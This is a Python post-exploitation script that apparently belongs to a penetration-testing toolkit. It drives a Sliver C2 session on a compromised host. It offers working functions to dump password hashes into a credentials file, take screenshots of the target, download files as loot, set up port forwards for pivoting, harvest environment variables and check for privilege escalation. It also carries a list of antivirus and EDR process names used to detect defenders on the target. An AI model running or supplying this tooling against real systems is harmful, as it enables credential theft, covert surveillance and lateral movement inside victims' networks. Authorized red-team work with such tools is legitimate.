#!/usr/bin/env python3
"""c2_post_exploit.py — Post-exploitation via Sliver C2 gRPC API.

Executes post-exploitation actions through an established Sliver session:
hashdump, screenshot, port forwarding, pivots, process listing, file download.

Usage:
    python3 c2_post_exploit.py --session-id abc123 --action hashdump
    python3 c2_post_exploit.py --session-id abc123 --action screenshot
    python3 c2_post_exploit.py --session-id abc123 --action enum
    python3 c2_post_exploit.py --session-id abc123 --action all --output-dir /pentest/output/job1

Actions:
    enum       — Situational awareness (whoami, ps, ifconfig, netstat, env)
    hashdump   — Dump SAM hashes (requires SYSTEM/root)
    screenshot — Capture target screenshot
    portfwd    — Set up port forwarding
    processes  — List running processes
    download   — Download a file from target
    privesc    — Attempt privilege escalation (getsystem)
    all        — Run enum + hashdump + screenshot + processes
"""

import argparse
import asyncio
import json
import logging
import os
import sys
import time
from datetime import datetime, timezone

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%SZ",
)
log = logging.getLogger("c2_post_exploit")

SLIVER_CONFIG = os.getenv("SLIVER_CONFIG", "/opt/sliver/configs/kali-operator.cfg")
OUTPUT_DIR = os.getenv("OUTPUT_DIR", "/pentest/output")


class C2PostExploit:
    """Post-exploitation operations via Sliver gRPC."""

    def __init__(self, config_path: str, output_dir: str):
        self.config_path = config_path
        self.output_dir = output_dir
        self.client = None
        self.session = None
        os.makedirs(output_dir, exist_ok=True)

    async def connect(self):
        """Connect to Sliver server via gRPC."""
        try:
            from sliver import SliverClientConfig, SliverClient
        except ImportError:
            log.error("sliver-py not installed. Run: pip install sliver-py")
            raise

        if not os.path.isfile(self.config_path):
            raise FileNotFoundError(f"Sliver config not found: {self.config_path}")

        config = SliverClientConfig.parse_config_file(self.config_path)
        self.client = SliverClient(config)
        await self.client.connect()
        log.info("Connected to Sliver server via gRPC")

    async def interact(self, session_id: str):
        """Start interacting with a session."""
        self.session = await self.client.interact_session(session_id)
        log.info(f"Interacting with session: {session_id}")

    async def action_enum(self) -> dict:
        """Situational awareness enumeration."""
        log.info("Running situational awareness enumeration...")
        results = {}

        # whoami
        try:
            whoami = await self.session.execute("whoami", ["/all"] if await self._is_windows() else [])
            results["whoami"] = {
                "stdout": whoami.Stdout.decode("utf-8", errors="replace") if whoami.Stdout else "",
                "stderr": whoami.Stderr.decode("utf-8", errors="replace") if whoami.Stderr else "",
            }
            log.info(f"whoami: {results['whoami']['stdout'][:100]}")
        except Exception as e:
            results["whoami"] = {"error": str(e)}

        # Process list
        try:
            ps = await self.session.ps()
            processes = []
            for p in ps:
                processes.append({
                    "pid": getattr(p, "Pid", 0),
                    "name": getattr(p, "Executable", ""),
                    "owner": getattr(p, "Owner", ""),
                })
            results["processes"] = processes
            results["process_count"] = len(processes)
            log.info(f"Processes: {len(processes)} found")
        except Exception as e:
            results["processes"] = {"error": str(e)}

        # Network interfaces
        try:
            ifconfig = await self.session.ifconfig()
            interfaces = []
            for iface in ifconfig:
                interfaces.append({
                    "name": getattr(iface, "Name", ""),
                    "mac": getattr(iface, "MAC", ""),
                    "addresses": [str(a) for a in getattr(iface, "IPAddresses", [])],
                })
            results["interfaces"] = interfaces
            log.info(f"Network interfaces: {len(interfaces)}")
        except Exception as e:
            results["interfaces"] = {"error": str(e)}

        # Netstat
        try:
            netstat = await self.session.netstat()
            connections = []
            for entry in netstat:
                connections.append({
                    "local": f"{getattr(entry, 'LocalAddr', '')}:{getattr(entry, 'LocalPort', '')}",
                    "remote": f"{getattr(entry, 'RemoteAddr', '')}:{getattr(entry, 'RemotePort', '')}",
                    "protocol": getattr(entry, "Protocol", ""),
                    "state": getattr(entry, "SkState", ""),
                    "pid": getattr(entry, "Pid", 0),
                })
            results["connections"] = connections[:50]  # Limit to 50
            results["connection_count"] = len(connections)
            log.info(f"Network connections: {len(connections)}")
        except Exception as e:
            results["connections"] = {"error": str(e)}

        # Environment variables
        try:
            env_result = await self.session.execute("env", [])
            env_str = env_result.Stdout.decode("utf-8", errors="replace") if env_result.Stdout else ""
            results["environment"] = env_str[:5000]  # Cap at 5KB
        except Exception as e:
            results["environment"] = {"error": str(e)}

        self._save_evidence("enum_results.json", results)
        return results

    async def action_hashdump(self) -> dict:
        """Dump SAM/shadow hashes."""
        log.info("Attempting hashdump...")
        results = {"action": "hashdump"}

        try:
            hashdump_result = await self.session.hashdump()
            hashes = []
            for entry in hashdump_result.Entries:
                hashes.append({
                    "user": getattr(entry, "User", ""),
                    "hash": getattr(entry, "Hash", ""),
                    "rid": getattr(entry, "RID", 0),
                })
            results["hashes"] = hashes
            results["count"] = len(hashes)
            results["status"] = "success" if hashes else "empty"
            log.info(f"Hashdump: {len(hashes)} entries extracted")
        except Exception as e:
            results["status"] = "error"
            results["error"] = str(e)
            log.error(f"Hashdump failed: {e}")

        # Save hashes (redacted in evidence, full in creds file)
        if results.get("hashes"):
            creds = {
                "source": "hashdump",
                "target_session": self.session.session_id if hasattr(self.session, "session_id") else "unknown",
                "extracted_at": datetime.now(timezone.utc).isoformat(),
                "credentials": results["hashes"],
            }
            self._save_evidence("creds_hashdump.json", creds)

            # Redacted version for evidence
            redacted = [{"user": h["user"], "hash": h["hash"][:8] + "..." if h.get("hash") else ""} for h in results["hashes"]]
            self._save_evidence("hashdump_evidence.json", {
                "action": "hashdump",
                "count": len(redacted),
                "sample": redacted[:5],
                "status": results["status"],
            })

        return results

    async def action_screenshot(self) -> dict:
        """Capture target screenshot."""
        log.info("Capturing screenshot...")
        results = {"action": "screenshot"}

        try:
            screenshot = await self.session.screenshot()
            if screenshot.Data:
                screenshot_path = os.path.join(self.output_dir, "screenshot.png")
                with open(screenshot_path, "wb") as f:
                    f.write(screenshot.Data)
                results["status"] = "success"
                results["path"] = screenshot_path
                results["size_bytes"] = len(screenshot.Data)
                log.info(f"Screenshot saved: {screenshot_path} ({len(screenshot.Data)} bytes)")
            else:
                results["status"] = "empty"
                results["error"] = "No screenshot data returned"
                log.warning("Screenshot returned empty data")
        except Exception as e:
            results["status"] = "error"
            results["error"] = str(e)
            log.error(f"Screenshot failed: {e}")

        self._save_evidence("screenshot_evidence.json", results)
        return results

    async def action_processes(self) -> dict:
        """List running processes."""
        log.info("Listing processes...")
        results = {"action": "processes"}

        try:
            ps = await self.session.ps()
            processes = []
            for p in ps:
                processes.append({
                    "pid": getattr(p, "Pid", 0),
                    "ppid": getattr(p, "Ppid", 0),
                    "name": getattr(p, "Executable", ""),
                    "owner": getattr(p, "Owner", ""),
                    "arch": getattr(p, "Architecture", ""),
                })
            results["processes"] = processes
            results["count"] = len(processes)
            results["status"] = "success"
            log.info(f"Processes: {len(processes)} found")

            # Identify interesting processes (AV/EDR)
            security_procs = [
                "MsMpEng.exe", "MsSense.exe",     # Defender
                "CSFalconService.exe",              # CrowdStrike
                "SentinelAgent.exe",                # SentinelOne
                "CylanceSvc.exe",                   # Cylance
                "cb.exe", "carbonblack",            # Carbon Black
                "cortex",                           # Palo Alto Cortex
            ]
            found_security = [
                p for p in processes
                if any(sp.lower() in (p.get("name") or "").lower() for sp in security_procs)
            ]
            if found_security:
                results["security_software"] = found_security
                log.warning(f"Security software detected: {[p['name'] for p in found_security]}")
        except Exception as e:
            results["status"] = "error"
            results["error"] = str(e)
            log.error(f"Process list failed: {e}")

        self._save_evidence("processes.json", results)
        return results

    async def action_portfwd(self, remote_host: str, remote_port: int, local_port: int) -> dict:
        """Set up port forwarding through the C2 session."""
        log.info(f"Setting up port forward: local:{local_port} → {remote_host}:{remote_port}")
        results = {"action": "portfwd"}

        try:
            await self.session.portfwd_add(local_port, remote_host, remote_port)
            results["status"] = "success"
            results["local_port"] = local_port
            results["remote_host"] = remote_host
            results["remote_port"] = remote_port
            log.info(f"Port forward established: 127.0.0.1:{local_port} → {remote_host}:{remote_port}")
        except Exception as e:
            results["status"] = "error"
            results["error"] = str(e)
            log.error(f"Port forward failed: {e}")

        return results

    async def action_download(self, remote_path: str) -> dict:
        """Download a file from the target."""
        log.info(f"Downloading: {remote_path}")
        results = {"action": "download", "remote_path": remote_path}

        try:
            download = await self.session.download(remote_path)
            if download.Data:
                filename = os.path.basename(remote_path)
                local_path = os.path.join(self.output_dir, f"loot_{filename}")
                with open(local_path, "wb") as f:
                    f.write(download.Data)
                results["status"] = "success"
                results["local_path"] = local_path
                results["size_bytes"] = len(download.Data)
                log.info(f"Downloaded: {remote_path} → {local_path} ({len(download.Data)} bytes)")
            else:
                results["status"] = "empty"
                log.warning(f"Download returned empty data for {remote_path}")
        except Exception as e:
            results["status"] = "error"
            results["error"] = str(e)
            log.error(f"Download failed: {e}")

        return results

    async def action_privesc(self) -> dict:
        """Attempt privilege escalation."""
        log.info("Attempting privilege escalation...")
        results = {"action": "privesc"}

        # Check current privileges first
        try:
            privs = await self.session.execute("whoami", ["/priv"] if await self._is_windows() else [])
            results["current_privs"] = privs.Stdout.decode("utf-8", errors="replace") if privs.Stdout else ""
        except Exception:
            pass

        # Try getsystem on Windows
        try:
            if await self._is_windows():
                getsystem = await self.session.execute(
                    "powershell", ["-c", "[Security.Principal.WindowsIdentity]::GetCurrent().Name"]
                )
                current_user = getsystem.Stdout.decode("utf-8", errors="replace") if getsystem.Stdout else ""
                results["current_user"] = current_user.strip()

                if "SYSTEM" in current_user.upper():
                    results["status"] = "already_system"
                    log.info("Already running as SYSTEM")
                else:
                    # Attempt token impersonation via various methods
                    results["status"] = "attempted"
                    results["note"] = "Use Sliver 'getsystem' or 'impersonate' interactively"
            else:
                id_result = await self.session.execute("id", [])
                current_id = id_result.Stdout.decode("utf-8", errors="replace") if id_result.Stdout else ""
                results["current_user"] = current_id.strip()
                if "uid=0" in current_id:
                    results["status"] = "already_root"
                    log.info("Already running as root")
                else:
                    results["status"] = "attempted"
                    results["note"] = "Run LinPEAS or check SUID binaries for privesc paths"
        except Exception as e:
            results["status"] = "error"
            results["error"] = str(e)
            log.error(f"Privesc check failed: {e}")

        self._save_evidence("privesc_results.json", results)
        return results

    async def action_all(self) -> dict:
        """Run all standard post-exploitation actions."""
        log.info("Running full post-exploitation suite...")
        results = {}

        results["enum"] = await self.action_enum()
        results["hashdump"] = await self.action_hashdump()
        results["screenshot"] = await self.action_screenshot()
        results["processes"] = await self.action_processes()
        results["privesc"] = await self.action_privesc()

        # Summary
        summary = {
            "actions_run": list(results.keys()),
            "successes": sum(1 for v in results.values() if v.get("status") == "success"),
            "errors": sum(1 for v in results.values() if v.get("status") == "error"),
            "completed_at": datetime.now(timezone.utc).isoformat(),
        }
        results["summary"] = summary
        self._save_evidence("post_exploit_summary.json", summary)

        return results

    async def _is_windows(self) -> bool:
        """Check if the target is Windows."""
        try:
            result = await self.session.execute("cmd", ["/c", "ver"])
            return bool(result.Stdout)
        except Exception:
            return False

    def _save_evidence(self, filename: str, data: dict):
        """Save evidence to the output directory."""
        path = os.path.join(self.output_dir, filename)
        try:
            with open(path, "w") as f:
                json.dump(data, f, indent=2, default=str)
            log.debug(f"Evidence saved: {path}")
        except Exception as e:
            log.warning(f"Failed to save evidence {path}: {e}")


async def run_post_exploit(args: argparse.Namespace) -> dict:
    """Execute post-exploitation actions."""
    c2 = C2PostExploit(
        config_path=args.config,
        output_dir=args.output_dir,
    )

    try:
        await c2.connect()
        await c2.interact(args.session_id)
    except Exception as e:
        return {"status": "error", "error": f"Connection failed: {e}"}

    action = args.action.lower()

    if action == "enum":
        return await c2.action_enum()
    elif action == "hashdump":
        return await c2.action_hashdump()
    elif action == "screenshot":
        return await c2.action_screenshot()
    elif action == "processes":
        return await c2.action_processes()
    elif action == "portfwd":
        if not args.remote_host or not args.remote_port:
            return {"status": "error", "error": "--remote-host and --remote-port required for portfwd"}
        return await c2.action_portfwd(args.remote_host, args.remote_port, args.local_port)
    elif action == "download":
        if not args.remote_path:
            return {"status": "error", "error": "--remote-path required for download"}
        return await c2.action_download(args.remote_path)
    elif action == "privesc":
        return await c2.action_privesc()
    elif action == "all":
        return await c2.action_all()
    else:
        return {"status": "error", "error": f"Unknown action: {action}"}


def main():
    parser = argparse.ArgumentParser(
        description="Post-exploitation via Sliver C2 gRPC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    parser.add_argument("--session-id", required=True,
                        help="Sliver session ID to interact with")
    parser.add_argument("--action", required=True,
                        choices=["enum", "hashdump", "screenshot", "processes",
                                 "portfwd", "download", "privesc", "all"],
                        help="Post-exploitation action to perform")
    parser.add_argument("--config", default=SLIVER_CONFIG,
                        help=f"Sliver operator config path (default: {SLIVER_CONFIG})")
    parser.add_argument("--output-dir", default=OUTPUT_DIR,
                        help=f"Evidence output directory (default: {OUTPUT_DIR})")

    # portfwd options
    parser.add_argument("--remote-host", default=None,
                        help="Remote host for port forwarding")
    parser.add_argument("--remote-port", type=int, default=None,
                        help="Remote port for port forwarding")
    parser.add_argument("--local-port", type=int, default=8080,
                        help="Local port for port forwarding (default: 8080)")

    # download options
    parser.add_argument("--remote-path", default=None,
                        help="Remote file path for download")

    parser.add_argument("--json", action="store_true", help="Output as JSON")

    args = parser.parse_args()

    result = asyncio.run(run_post_exploit(args))

    if args.json:
        print(json.dumps(result, indent=2, default=str))
    else:
        status = result.get("status", "unknown")
        if status == "error":
            print(f"[-] Error: {result.get('error', 'unknown')}", file=sys.stderr)
            sys.exit(1)
        else:
            print(f"[+] Post-exploitation action '{args.action}' completed")
            if isinstance(result, dict):
                for key, value in result.items():
                    if key in ("status", "action"):
                        continue
                    if isinstance(value, (str, int, float)):
                        print(f"    {key}: {value}")
                    elif isinstance(value, list):
                        print(f"    {key}: {len(value)} items")
                    elif isinstance(value, dict) and "error" in value:
                        print(f"    {key}: ERROR — {value['error']}")


if __name__ == "__main__":
    main()
